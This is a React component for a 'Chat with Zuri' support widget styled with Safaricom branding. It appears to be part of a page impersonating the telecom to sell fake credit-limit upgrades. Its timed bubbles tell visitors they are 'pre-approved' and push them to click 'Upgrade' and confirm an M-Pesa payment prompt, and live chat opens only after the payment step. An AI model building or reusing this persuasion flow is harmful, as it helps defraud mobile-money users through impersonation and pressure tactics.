import React from "react";
import { useState, useEffect } from 'react';
import { SAFARICOM_GREEN } from '../utils/constants';

export default function ZuriChatWidget({ hasReachedFinalStep, currentPage }) {
  const [showBubble, setShowBubble] = useState(false);
  const [bubbleMessage, setBubbleMessage] = useState('');

  // Update bubble message based on current page
  useEffect(() => {
    if (!hasReachedFinalStep) {
      let msg = '';

      switch (currentPage) {
        case 'landing':
          msg = "I'm standing by to help! Please check your eligibility and select a limit first so I can assist you better.";
          break;
        case 'main':
          msg = "Great news! You've been pre-approved. Select the limit that fits your needs and click 'Upgrade' so I can finalize your file.";
          break;
        case 'payment':
          msg = "I see you're almost done! Once you confirm the M-Pesa prompt on your phone, I'll be able to activate your new limit immediately.";
          break;
        default:
          msg = "Need help choosing the right limit for your line?";
      }

      setBubbleMessage(msg);
    }
  }, [currentPage, hasReachedFinalStep]);

  const toggleChat = () => {
    if (hasReachedFinalStep) {
      // Open Tawk.to chat
      if (window.Tawk_API) {
        window.Tawk_API.toggle();
      }
    } else {
      // Show bubble temporarily
      setShowBubble(true);
      setTimeout(() => setShowBubble(false), 5000);
    }
  };

  const startNudge = () => {
    if (!hasReachedFinalStep) {
      setTimeout(() => {
        setShowBubble(true);
        setTimeout(() => setShowBubble(false), 5000);
      }, 30000);
    }
  };

  // Start nudge timer when component mounts
  useEffect(() => {
    startNudge();
  }, []);

  return (
    <div
      id="zuri-container"
      className="fixed bottom-6 right-6 z-[500] cursor-pointer flex flex-col items-end"
    >
      {/* Chat bubble */}
      {showBubble && !hasReachedFinalStep && (
        <div
          id="zuri-bubble"
          className="bg-white text-slate-800 text-[11px] font-bold py-2.5 px-4 rounded-2xl shadow-2xl border-2 animate-bounce relative max-w-[180px] text-center mb-3"
          style={{ borderColor: SAFARICOM_GREEN }}
        >
          {bubbleMessage}
          <div
            className="absolute -bottom-2 right-6 w-3 h-3 bg-white border-r-2 border-b-2 rotate-45"
            style={{ borderColor: SAFARICOM_GREEN }}
          />
        </div>
      )}

      {/* Chat button */}
      <button
        onClick={toggleChat}
        className="group flex items-center gap-3 bg-white p-2 pr-6 rounded-full shadow-[0_15px_35px_rgba(0,0,0,0.15)] border-2 border-slate-100 hover:border-safaricom transition-all active:scale-95"
        style={{ borderColor: hasReachedFinalStep ? SAFARICOM_GREEN : '#e2e8f0' }}
      >
        <div
          className="w-12 h-12 bg-safaricom rounded-full flex items-center justify-center text-white relative shadow-lg"
          style={{ backgroundColor: SAFARICOM_GREEN }}
        >
          <i className="fas fa-headset text-xl"></i>
          <div
            className="absolute -bottom-0.5 -right-0.5 w-4 h-4 bg-green-500 border-2 border-white rounded-full online-indicator"
          />
        </div>
        <div className="flex flex-col">
          <span className="text-[9px] font-black text-slate-400 uppercase tracking-widest leading-none">
            Support
          </span>
          <span className="text-[13px] font-extrabold text-slate-800">Chat with Zuri</span>
        </div>
      </button>
    </div>
  );
}